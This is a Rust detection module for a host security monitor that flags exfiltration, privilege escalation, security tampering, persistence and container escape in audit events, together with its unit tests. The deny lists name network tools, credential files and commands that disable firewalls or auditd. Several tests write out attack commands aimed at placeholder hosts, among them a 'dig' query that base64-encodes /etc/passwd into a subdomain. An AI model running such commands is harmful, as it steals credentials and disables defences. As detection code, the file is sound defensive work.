use std::fmt;

use crate::alerts::Severity;
use crate::auditd::ParsedEvent;

/// Categories of suspicious behavior
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum BehaviorCategory {
    DataExfiltration,
    PrivilegeEscalation,
    SecurityTamper,
    Reconnaissance,
    SideChannel,
    SecureClawMatch,
}

impl fmt::Display for BehaviorCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            BehaviorCategory::DataExfiltration => write!(f, "DATA_EXFIL"),
            BehaviorCategory::PrivilegeEscalation => write!(f, "PRIV_ESC"),
            BehaviorCategory::SecurityTamper => write!(f, "SEC_TAMPER"),
            BehaviorCategory::Reconnaissance => write!(f, "RECON"),
            BehaviorCategory::SideChannel => write!(f, "SIDE_CHAN"),
            BehaviorCategory::SecureClawMatch => write!(f, "SC_MATCH"),
        }
    }
}

/// Sensitive files that should never be read by the watched user
const CRITICAL_READ_PATHS: &[&str] = &[
    "/etc/shadow",
    "/etc/sudoers",
    "/etc/gshadow",
    "/etc/master.passwd",
    "/proc/kcore",
    "/proc/self/environ",
    "/proc/1/environ",
];

/// Sensitive files that should never be written by the watched user
const CRITICAL_WRITE_PATHS: &[&str] = &[
    "/etc/passwd",
    "/etc/hosts",
    "/etc/crontab",
    "/etc/sudoers",
    "/etc/shadow",
    "/etc/rc.local",
    "/etc/ld.so.preload",
];

/// Reconnaissance-indicative file paths
const RECON_PATHS: &[&str] = &[
    ".env",
    ".aws/credentials",
    ".aws/config",
    ".ssh/id_rsa",
    ".ssh/id_ed25519",
    ".ssh/config",
    ".ssh/known_hosts",
    ".gnupg/",
    ".kube/config",
    "/proc/kallsyms",
    "/sys/devices/system/cpu/vulnerabilities/",
    "/proc/self/cmdline",
    "/proc/self/maps",
    "/proc/self/status",
];

/// Network exfiltration tools
const EXFIL_COMMANDS: &[&str] = &["curl", "wget", "nc", "ncat", "netcat", "socat"];

/// DNS exfiltration tools
const DNS_EXFIL_COMMANDS: &[&str] = &["dig", "nslookup", "host", "drill", "resolvectl"];

/// Security-disabling commands (matched as substrings of full command)
const SECURITY_TAMPER_PATTERNS: &[&str] = &[
    "ufw disable",
    "iptables -f",
    "iptables --flush",
    "iptables -F",
    "nft flush",
    "systemctl stop apparmor",
    "systemctl disable apparmor",
    "systemctl stop auditd",
    "systemctl disable auditd",
    "systemctl stop openclawav",
    "systemctl disable openclawav",
    "systemctl stop samhain",
    "systemctl disable samhain",
    "systemctl stop fail2ban",
    "systemctl disable fail2ban",
    "aa-teardown",
    "setenforce 0",
];

/// Recon commands
const RECON_COMMANDS: &[&str] = &["whoami", "id", "uname", "env", "printenv", "hostname", "ifconfig", "ip addr"];

/// Side-channel attack tools
const SIDECHANNEL_TOOLS: &[&str] = &["mastik", "flush-reload", "prime-probe", "sgx-step", "cache-attack"];

/// Container escape command patterns
const CONTAINER_ESCAPE_PATTERNS: &[&str] = &[
    "nsenter",
    "unshare",
    "mount /",
    "--privileged",
    "/proc/1/root",
    "/proc/sysrq-trigger",
    "/.dockerenv",
    "/var/run/docker.sock",
    "docker.sock",
    "cgroup release_agent",
];

/// Container escape binaries
const CONTAINER_ESCAPE_BINARIES: &[&str] = &["nsenter", "unshare", "runc", "ctr", "crictl"];

/// Persistence-related binaries
const PERSISTENCE_BINARIES: &[&str] = &["crontab", "at", "atq", "atrm", "batch"];

/// Persistence-related write paths
const PERSISTENCE_WRITE_PATHS: &[&str] = &[
    "/etc/cron",          // covers cron.d, cron.daily, cron.hourly, etc.
    "/var/spool/cron",
    "/var/spool/at",
    "/etc/rc.local",
    "/etc/init.d/",
    "/etc/systemd/system/",
    "/usr/lib/systemd/system/",
    "/etc/profile.d/",
    "/etc/ld.so.preload",
];

/// Patterns that indicate LD_PRELOAD bypass attempts
const PRELOAD_BYPASS_PATTERNS: &[&str] = &[
    "ld.so.preload",
    "LD_PRELOAD",
    "LD_LIBRARY_PATH",
    "ld-linux",
    "/lib/ld-",
];

/// Tools commonly used to compile static binaries or bypass dynamic linking
const STATIC_COMPILE_PATTERNS: &[&str] = &[
    "-static",
    "-static-libgcc",
    "musl-gcc",
    "musl-cc",
];

/// Classify a parsed audit event against known attack patterns.
/// Returns Some((category, severity)) if the event matches a rule, None otherwise.
pub fn classify_behavior(event: &ParsedEvent) -> Option<(BehaviorCategory, Severity)> {
    // Check EXECVE events with actual commands
    if let Some(ref cmd) = event.command {
        let cmd_lower = cmd.to_lowercase();
        let args = &event.args;
        let binary = args.first().map(|s| {
            // Extract basename from full path
            s.rsplit('/').next().unwrap_or(s)
        }).unwrap_or("");

        // --- CRITICAL: Security Tamper ---
        // Match against both original and lowercased (some flags are case-sensitive like -F)
        for pattern in SECURITY_TAMPER_PATTERNS {
            if cmd_lower.contains(pattern) || cmd.contains(pattern) {
                return Some((BehaviorCategory::SecurityTamper, Severity::Critical));
            }
        }

        // --- CRITICAL: Persistence mechanisms ---
        if PERSISTENCE_BINARIES.iter().any(|&c| binary.eq_ignore_ascii_case(c)) {
            return Some((BehaviorCategory::SecurityTamper, Severity::Critical));
        }

        // systemd timer/service creation
        if binary == "systemctl" && args.iter().any(|a| a == "enable" || a == "start") {
            // Enabling/starting arbitrary services could be persistence
            return Some((BehaviorCategory::SecurityTamper, Severity::Warning));
        }

        // --- CRITICAL: Container escape attempts ---
        if CONTAINER_ESCAPE_BINARIES.iter().any(|&c| binary.eq_ignore_ascii_case(c)) {
            return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
        }

        // Check command string for container escape patterns
        if let Some(ref cmd) = event.command {
            for pattern in CONTAINER_ESCAPE_PATTERNS {
                if cmd.contains(pattern) {
                    return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
                }
            }
        }

        // --- CRITICAL: LD_PRELOAD bypass attempts ---
        if let Some(ref cmd) = event.command {
            // Direct manipulation of preload config
            for pattern in PRELOAD_BYPASS_PATTERNS {
                if cmd.contains(pattern) {
                    // Don't flag our own legitimate preload operations
                    if !cmd.contains("openclawav") && !cmd.contains("clawguard") {
                        return Some((BehaviorCategory::SecurityTamper, Severity::Critical));
                    }
                }
            }
            
            // Compiling static binaries to bypass dynamic linking
            for pattern in STATIC_COMPILE_PATTERNS {
                if cmd.contains(pattern) {
                    return Some((BehaviorCategory::SecurityTamper, Severity::Warning));
                }
            }
        }

        // Direct invocation of the dynamic linker (bypass LD_PRELOAD)
        if binary == "ld-linux-aarch64.so.1" || binary == "ld-linux-x86-64.so.2" || binary.starts_with("ld-linux") || binary == "ld.so" {
            return Some((BehaviorCategory::SecurityTamper, Severity::Critical));
        }

        // ptrace can be used to bypass LD_PRELOAD by injecting code directly
        if ["strace", "ltrace", "gdb", "lldb", "ptrace"].contains(&binary) {
            return Some((BehaviorCategory::SecurityTamper, Severity::Critical));
        }

        // --- CRITICAL: Data Exfiltration via network tools ---
        if EXFIL_COMMANDS.iter().any(|&c| binary.eq_ignore_ascii_case(c)) {
            return Some((BehaviorCategory::DataExfiltration, Severity::Critical));
        }

        // --- DNS exfiltration — tools that can encode data in DNS queries ---
        if DNS_EXFIL_COMMANDS.iter().any(|&c| binary.eq_ignore_ascii_case(c)) {
            // Check if any arg looks like encoded data (long subdomains, base64 patterns)
            let suspicious = args.iter().skip(1).any(|arg| {
                // Long hostnames with many dots (data chunked across labels)
                let dot_count = arg.matches('.').count();
                let has_long_labels = arg.split('.').any(|label| label.len() > 25);
                // Or contains shell substitution / piping
                let has_subshell = arg.contains('$') || arg.contains('`');
                (dot_count > 4 && has_long_labels) || has_subshell || dot_count > 6
            });
            if suspicious {
                return Some((BehaviorCategory::DataExfiltration, Severity::Critical));
            }
            // Even non-suspicious DNS lookups by the agent are worth noting
            return Some((BehaviorCategory::Reconnaissance, Severity::Info));
        }

        // --- Scripted DNS exfiltration ---
        if ["python", "python3", "node", "ruby", "perl"].contains(&binary) {
            if let Some(ref cmd) = event.command {
                let cmd_lower = cmd.to_lowercase();
                if cmd_lower.contains("getaddrinfo") || cmd_lower.contains("dns.resolve") || 
                   cmd_lower.contains("socket.gethostbyname") || cmd_lower.contains("resolver") {
                    return Some((BehaviorCategory::DataExfiltration, Severity::Critical));
                }
            }
        }

        // --- CRITICAL: Side-channel attack tools ---
        if SIDECHANNEL_TOOLS.iter().any(|&c| binary.eq_ignore_ascii_case(c)) {
            return Some((BehaviorCategory::SideChannel, Severity::Critical));
        }

        // --- CRITICAL: Reading sensitive files ---
        if ["cat", "less", "more", "head", "tail", "xxd", "base64", "cp", "scp"].contains(&binary) {
            for arg in args.iter().skip(1) {
                for path in CRITICAL_READ_PATHS {
                    if arg.contains(path) {
                        return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
                    }
                }
            }
        }

        // --- CRITICAL: Writing to sensitive files ---
        if ["tee", "cp", "mv", "install"].contains(&binary) {
            for arg in args.iter().skip(1) {
                for path in CRITICAL_WRITE_PATHS {
                    if arg.contains(path) {
                        return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
                    }
                }
            }
        }

        // --- CRITICAL: Editors on sensitive files ---
        if ["vi", "vim", "nano", "sed", "ed"].contains(&binary) {
            for arg in args.iter().skip(1) {
                for path in CRITICAL_WRITE_PATHS {
                    if arg.contains(path) {
                        return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
                    }
                }
            }
        }

        // --- WARNING: Reconnaissance commands ---
        if RECON_COMMANDS.iter().any(|&c| {
            let c_base = c.split_whitespace().next().unwrap_or(c);
            binary.eq_ignore_ascii_case(c_base)
        }) {
            return Some((BehaviorCategory::Reconnaissance, Severity::Warning));
        }

        // --- WARNING: Reading recon-sensitive files ---
        if ["cat", "less", "more", "head", "tail", "cp"].contains(&binary) {
            for arg in args.iter().skip(1) {
                for path in RECON_PATHS {
                    if arg.contains(path) {
                        return Some((BehaviorCategory::Reconnaissance, Severity::Warning));
                    }
                }
            }
        }

        // --- CRITICAL: base64 encoding + suspicious piping ---
        if binary == "base64" {
            // base64 encoding of files is suspicious
            return Some((BehaviorCategory::DataExfiltration, Severity::Warning));
        }

        // --- CRITICAL: Memory/environ dumping tools ---
        if ["strings", "xxd", "od"].contains(&binary) {
            for arg in args.iter().skip(1) {
                if arg.contains("/proc/") && (arg.contains("/environ") || arg.contains("/mem") || arg.contains("/maps")) {
                    return Some((BehaviorCategory::DataExfiltration, Severity::Critical));
                }
            }
        }
    }

    // Check syscall-level events for file access to sensitive paths
    if let Some(ref path) = event.file_path {
        // openat/read on critical files
        if ["openat", "newfstatat", "statx"].contains(&event.syscall_name.as_str()) && event.success {
            for crit_path in CRITICAL_READ_PATHS {
                if path.contains(crit_path) {
                    return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
                }
            }
            for recon_path in RECON_PATHS {
                if path.contains(recon_path) {
                    return Some((BehaviorCategory::Reconnaissance, Severity::Warning));
                }
            }
            for persist_path in &PERSISTENCE_WRITE_PATHS[..] {
                if path.contains(persist_path) {
                    return Some((BehaviorCategory::SecurityTamper, Severity::Warning));
                }
            }
        }

        // unlinkat/renameat on critical files
        if ["unlinkat", "renameat"].contains(&event.syscall_name.as_str()) {
            for crit_path in CRITICAL_WRITE_PATHS {
                if path.contains(crit_path) {
                    return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
                }
            }
            // Persistence via writing to cron/systemd/init paths
            for persist_path in &PERSISTENCE_WRITE_PATHS[..] {
                if path.contains(persist_path) {
                    return Some((BehaviorCategory::SecurityTamper, Severity::Critical));
                }
            }
        }

        // Container escape via socket/proc access
        if ["openat", "newfstatat", "statx", "connect"].contains(&event.syscall_name.as_str()) && event.success {
            let container_escape_paths = ["/var/run/docker.sock", "/proc/1/root", "/proc/sysrq-trigger"];
            for escape_path in &container_escape_paths {
                if path.contains(escape_path) {
                    return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
                }
            }
        }

        // Catch any /proc/*/environ access (not just self/1)
        if path.contains("/proc/") && path.contains("/environ") {
            return Some((BehaviorCategory::DataExfiltration, Severity::Critical));
        }

        // /proc/*/mem access (memory reading)
        if path.contains("/proc/") && path.ends_with("/mem") {
            return Some((BehaviorCategory::DataExfiltration, Severity::Critical));
        }
    }

    // perf_event_open can be used for cache timing attacks
    if event.syscall_name == "perf_event_open" {
        return Some((BehaviorCategory::SideChannel, Severity::Warning));
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_exec_event(args: &[&str]) -> ParsedEvent {
        ParsedEvent {
            syscall_name: "execve".to_string(),
            command: Some(args.join(" ")),
            args: args.iter().map(|s| s.to_string()).collect(),
            file_path: None,
            success: true,
            raw: String::new(),
        }
    }

    fn make_syscall_event(name: &str, path: &str) -> ParsedEvent {
        ParsedEvent {
            syscall_name: name.to_string(),
            command: None,
            args: vec![],
            file_path: Some(path.to_string()),
            success: true,
            raw: String::new(),
        }
    }

    // --- Data Exfiltration ---

    #[test]
    fn test_curl_is_exfil() {
        let event = make_exec_event(&["curl", "http://evil.com/exfil"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    #[test]
    fn test_wget_is_exfil() {
        let event = make_exec_event(&["wget", "http://evil.com/payload"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    #[test]
    fn test_nc_is_exfil() {
        let event = make_exec_event(&["nc", "10.0.0.1", "4444"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    #[test]
    fn test_full_path_curl_is_exfil() {
        let event = make_exec_event(&["/usr/bin/curl", "-s", "http://evil.com"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    // --- DNS Exfiltration ---

    #[test]
    fn test_dig_with_encoded_data_is_exfil() {
        let event = make_exec_event(&["dig", "AQAAABABASE64ENCODEDDATA.evil.com.attacker.net.c2.example.com"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    #[test]
    fn test_dig_with_subshell_is_exfil() {
        let event = make_exec_event(&["dig", "$(cat /etc/passwd | base64).evil.com"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    #[test]
    fn test_nslookup_normal_is_recon() {
        let event = make_exec_event(&["nslookup", "google.com"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Info)));
    }

    #[test]
    fn test_python_dns_exfil() {
        let event = make_exec_event(&["python3", "-c", "import socket; socket.gethostbyname('data.evil.com')"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    // --- Privilege Escalation ---

    #[test]
    fn test_cat_etc_shadow() {
        let event = make_exec_event(&["cat", "/etc/shadow"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_cat_etc_sudoers() {
        let event = make_exec_event(&["cat", "/etc/sudoers"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_write_etc_passwd() {
        let event = make_exec_event(&["tee", "/etc/passwd"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_vim_etc_hosts() {
        let event = make_exec_event(&["vim", "/etc/hosts"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_openat_shadow_syscall() {
        let event = make_syscall_event("openat", "/etc/shadow");
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_unlinkat_passwd() {
        let event = make_syscall_event("unlinkat", "/etc/passwd");
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    // --- Security Tamper ---

    #[test]
    fn test_ufw_disable() {
        let event = make_exec_event(&["ufw", "disable"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    #[test]
    fn test_iptables_flush() {
        let event = make_exec_event(&["iptables", "-F"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    #[test]
    fn test_stop_auditd() {
        let event = make_exec_event(&["systemctl", "stop", "auditd"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    #[test]
    fn test_stop_apparmor() {
        let event = make_exec_event(&["systemctl", "disable", "apparmor"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    // --- Reconnaissance ---

    #[test]
    fn test_whoami_recon() {
        let event = make_exec_event(&["whoami"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_id_recon() {
        let event = make_exec_event(&["id"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_uname_recon() {
        let event = make_exec_event(&["uname", "-a"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_cat_env_file() {
        let event = make_exec_event(&["cat", "/home/user/.env"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_cat_aws_credentials() {
        let event = make_exec_event(&["cat", "/home/user/.aws/credentials"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_cat_ssh_key() {
        let event = make_exec_event(&["cat", "/home/user/.ssh/id_rsa"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_openat_env_file() {
        let event = make_syscall_event("openat", "/opt/app/.env");
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    // --- Benign ---

    #[test]
    fn test_ls_is_benign() {
        let event = make_exec_event(&["ls", "-la", "/tmp"]);
        let result = classify_behavior(&event);
        assert_eq!(result, None);
    }

    #[test]
    fn test_cat_normal_file() {
        let event = make_exec_event(&["cat", "/tmp/notes.txt"]);
        let result = classify_behavior(&event);
        assert_eq!(result, None);
    }

    #[test]
    fn test_openat_normal_file() {
        let event = make_syscall_event("openat", "/tmp/something");
        let result = classify_behavior(&event);
        assert_eq!(result, None);
    }

    // --- Side-Channel Attack Detection ---

    #[test]
    fn test_sidechannel_tool_mastik() {
        let event = make_exec_event(&["mastik", "--attack-type", "flush-reload"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SideChannel, Severity::Critical)));
    }

    #[test]
    fn test_sidechannel_tool_flush_reload() {
        let event = make_exec_event(&["flush-reload", "/usr/lib/x86_64-linux-gnu/libcrypto.so.1.1"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SideChannel, Severity::Critical)));
    }

    #[test]
    fn test_sidechannel_tool_prime_probe() {
        let event = make_exec_event(&["prime-probe", "--target", "aes"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SideChannel, Severity::Critical)));
    }

    #[test]
    fn test_sidechannel_tool_sgx_step() {
        let event = make_exec_event(&["sgx-step", "--victim", "/opt/enclave.so"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SideChannel, Severity::Critical)));
    }

    #[test]
    fn test_sidechannel_tool_cache_attack() {
        let event = make_exec_event(&["cache-attack", "--L1d", "--target", "openssl"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SideChannel, Severity::Critical)));
    }

    #[test]
    fn test_perf_event_open_syscall() {
        let mut event = make_syscall_event("perf_event_open", "");
        event.file_path = None; // perf_event_open doesn't involve file paths
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SideChannel, Severity::Warning)));
    }

    #[test]
    fn test_access_proc_kcore() {
        let event = make_exec_event(&["cat", "/proc/kcore"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_access_proc_kallsyms() {
        let event = make_exec_event(&["cat", "/proc/kallsyms"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_access_cpu_vulnerabilities() {
        let event = make_exec_event(&["cat", "/sys/devices/system/cpu/vulnerabilities/spectre_v1"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_openat_proc_kcore_syscall() {
        let event = make_syscall_event("openat", "/proc/kcore");
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_openat_proc_kallsyms_syscall() {
        let event = make_syscall_event("openat", "/proc/kallsyms");
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_cachegrind_not_flagged_as_sidechannel() {
        // cachegrind is a legitimate profiling tool (valgrind --tool=cachegrind)
        // It's not in SIDECHANNEL_TOOLS, so it should not be flagged
        let event = make_exec_event(&["cachegrind", "--trace", "/tmp/program"]);
        let result = classify_behavior(&event);
        assert_eq!(result, None);
    }

    // --- Container Escape Detection ---

    #[test]
    fn test_nsenter_is_container_escape() {
        let event = make_exec_event(&["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_docker_socket_access() {
        let event = make_syscall_event("openat", "/var/run/docker.sock");
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_proc_1_root_escape() {
        let event = make_exec_event(&["cat", "/proc/1/root/etc/shadow"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_mount_host_root() {
        let event = make_exec_event(&["mount", "/dev/sda1", "/mnt"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_unshare_escape() {
        let event = make_exec_event(&["unshare", "--mount", "--pid", "--fork", "bash"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    // --- Persistence Detection ---

    #[test]
    fn test_crontab_is_persistence() {
        let event = make_exec_event(&["crontab", "-e"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    #[test]
    fn test_at_is_persistence() {
        let event = make_exec_event(&["at", "now", "+", "1", "hour"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    #[test]
    fn test_systemctl_enable_is_persistence() {
        let event = make_exec_event(&["systemctl", "enable", "evil-service"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Warning)));
    }

    #[test]
    fn test_write_cron_d() {
        let event = make_syscall_event("openat", "/etc/cron.d/evil-job");
        let result = classify_behavior(&event);
        // Should match persistence path
        assert!(result.is_some());
    }

    #[test]
    fn test_write_systemd_service() {
        let event = make_syscall_event("unlinkat", "/etc/systemd/system/evil.service");
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }
}
